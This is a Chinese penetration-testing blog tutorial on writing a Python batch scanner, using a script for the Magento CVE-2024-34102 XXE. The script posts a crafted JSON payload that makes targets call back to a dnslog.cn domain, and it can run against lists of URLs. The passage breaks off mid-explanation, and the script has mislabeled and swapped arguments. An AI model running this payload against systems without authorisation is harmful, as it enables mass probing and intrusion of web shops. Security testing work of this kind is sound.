---
title: 快速编写一款python漏洞批量检测工具 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18411810
source: 博客园 - 渗透测试中心
date: 2024-09-14
fetch_date: 2025-10-06T18:27:32.316944
---

# 快速编写一款python漏洞批量检测工具 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [快速编写一款python漏洞批量检测工具](https://www.cnblogs.com/backlion/p/18411810 "发布于 2024-09-13 10:47")

### 一、前言

以下列检测脚本示列：

```
 import requests
 import urllib3
 import re,string,random
 from urllib.parse import urljoin
 import argparse
 import time
 import ssl
 ssl._create_default_https_context = ssl._create_unverified_context
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

 def banner():
     print()
     print(r'''
      ______     _______     ____   ___ ____  _  _        ____   ___ _____ __
  / ___\ \   / / ____|   |___ \ / _ \___ \| || |      |___ \ / _ \___  / /_
 | |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ __) | | | | / / '_ \
 | |___  \ V / | |__|_____/ __/| |_| / __/|__   _|_____/ __/| |_| |/ /| (_) |
  \____|  \_/  |_____|   |_____|\___/_____|  |_|      |_____|\___//_/  \___/

  _____
 |___  |
    / /
   / /
  /_/
     ''')
     print()

 def read_file(file_path):
     with open(file_path, 'r') as file:
         urls = file.read().splitlines()
     return urls

 def check(url):
     url = url.rstrip("/")
     taeget_url = urljoin(url, "/rest/V1/guest-carts/1/estimate-shipping-methods")
     try:
         headers = {
             "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
             "Content-Type": "application/json"
         }
         getdomain = requests.get(url='http://dnslog.cn/getdomain.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
         domain = str(getdomain.text)
         data = """{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"http://%s","dataIsURL":true,"options":12345678}}}}}}"""%(domain)
         requests.post(taeget_url, verify=False, headers=headers, data=data, timeout=25)
         for i in range(0, 3):
             refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
             time.sleep(1)
             if domain in refresh.text:
                 print(f"\033[31mDiscovered:{url}:AdobeMagento_CVE-2024-34102_XXE!\033[0m")
                 return True
     except Exception as e:
         pass

 if __name__ == "__main__":
     banner()
     parser = argparse.ArgumentParser(description='AdobeColdFusion_CVE-2024-20767_ArbitraryFileRead检测脚本')
     parser.add_argument("-u", "--url",type=str, help="单个URL检测")
     parser.add_argument("-f", "--txt",type=str, help="批量URL文件加载检测")

     args = parser.parse_args()
     if args.url:
         read_file(args.url)
     elif args.txt:
         check(args.txt)
     else:
         parser.print_help()
```

以上批量检测代码的主要功能点：

1.banner函数模块，用于展示图形化标识，以美化展示脚本

2.read\_file函数模块，用于批量读取文件中的url地址

3.check函数模块，用于对漏洞进行检测，这里最好使用BP进行构造，根据响应包中的返回值进行规则匹配

4.main函数模块，主要调用以上3个函数，以及引用命令行解析器 parser

### 二、导入python包

可使用python PyCharm Community 错误功能检测出需要导入的包

```

```

```
 import requests
 import urllib3
 import re,string,random
 from urllib.parse import urljoin
 import argparse
 import time
 import ssl
 ssl._create_default_https_context = ssl._create_unverified_context
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```

![image-20240801024603100](https://img2023.cnblogs.com/blog/1049983/202409/1049983-20240913104723855-1589876525.png)

### 三、函数功能模块

#### 1.banner标识函数功能

```
 def banner():
     print()
     print(r'''
       ______     _______     ____   ___ ____  _  _        _____ _  _   _  ___
  / ___\ \   / / ____|   |___ \ / _ \___ \| || |      |___ /| || | / |/ _ \
 | |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| || |_| | | | |
 | |___  \ V / | |__|_____/ __/| |_| / __/|__   _|_____|__) |__   _| | |_| |
  \____|  \_/  |_____|   |_____|\___/_____|  |_|      |____/   |_| |_|\___/

  ____
 |___ \
   __) |
  / __/
 |_____|
                             ''')
     print()
```

功能：该函数打印出一个图形化的 banner

在线生成工具：<http://www.network-science.de/ascii/>

或者使用pyfiglet进行本地生成，可将生成的code在python代码中进行替换

```
 pip install pyfiglet

 C:\Users\test>pyfiglet CVE-2024-34102
   ______     _______     ____   ___ ____  _  _        _____ _  _   _  ___
  / ___\ \   / / ____|   |___ \ / _ \___ \| || |      |___ /| || | / |/ _ \
 | |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| || |_| | | | |
 | |___  \ V / | |__|_____/ __/| |_| / __/|__   _|_____|__) |__   _| | |_| |
  \____|  \_/  |_____|   |_____|\___/_____|  |_|      |____/   |_| |_|\___/

  ____
 |___ \
   __) |
  / __/
 |_____|
```

#### 2.read\_file函数模块

功能：该函数读取指定文件中的每一行，并返回一个包含这些行内容（假设为URL）的列表

**注意：该代码模块，可固定不变**

```
 def read_file(file_path): #定义一个名为read_file的函数，该函数接受一个参数file_path，表示文件的路径
     with open(file_path, 'r') as file:
     #使用open函数以读取模式（'r'）打开指定路径的文件，并将文件对象赋值给变量file。with语句确保在代码块结束后文件会自动关闭
         urls = file.read().splitlines()
         #读取文件的全部内容，并将其按行分割成一个列表。每行的内容作为列表的一个元素。splitlines()方法会移除每行的换行符
     return urls  #返回一个包含所有URL的列表
```

#### 3.check函数模块

**注意：这里可根据实际情况进行修改**

```
 def check(url):
 #定义一个名为check的函数，接受一个参数url，表示要检查的URL
     url = url.rstrip("/")
     #去掉URL末尾的斜杠（如果有的话）
     taeget_url = urljoin(url, "/rest/V1/guest-carts/1/estimate-shipping-methods")
     #使用urljoin函数将给定的URL与指定路径拼接，生成目标URL
     try:
     #尝试执行以下代码块，如果发生异常则跳到except块
         headers = {
             "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
             "Content-Type": "application/json"
         }
         #设置HTTP请求头，headers包含User-Agent和Content-Type，Content-Type是post请求包格式
         getdomain = requests.get(url='http://dnslog.cn/getdomain.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
         #向dnslog.cn发送一个GET请求以获取一个唯一的域名，这个域名将用来检测漏洞。
         domain = str(getdomain.text)
         #将响应内容转换为字符串并赋值给变量domain
         data = """{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"http://%s","dataIsURL":true,"options":12345678}}}}}}"""%(domain)
         #构造一个包含domain的JSON数据字符串，目的是利用该漏洞进行攻击
         requests.post(taeget_url, verify=False, headers=headers, data=data, timeout=25)
         #向目标UR...